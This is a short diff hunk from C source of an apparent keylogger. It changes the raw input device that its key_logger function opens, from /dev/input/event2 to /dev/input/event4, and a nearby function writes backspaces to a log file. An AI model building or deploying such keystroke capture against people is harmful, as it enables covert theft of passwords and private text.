@@ -72,7 +72,7 @@ void handle_backspace (FILE * log) {
 }
 
 int key_logger ( ) {
-    int fd = open("/dev/input/event2", O_RDONLY);
+    int fd = open("/dev/input/event4", O_RDONLY);
     if (fd < 0) {
         perror("open event device");
         return 1;
